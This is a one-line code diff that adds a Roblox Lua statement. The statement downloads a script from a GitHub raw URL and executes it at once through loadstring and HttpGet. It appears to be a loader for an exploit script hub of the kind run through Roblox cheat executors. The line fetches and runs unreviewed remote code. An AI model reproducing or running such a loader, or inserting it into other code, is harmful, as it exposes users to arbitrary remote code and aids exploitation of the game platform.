@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Load-all-script-in-one-script/main/.lua"))()
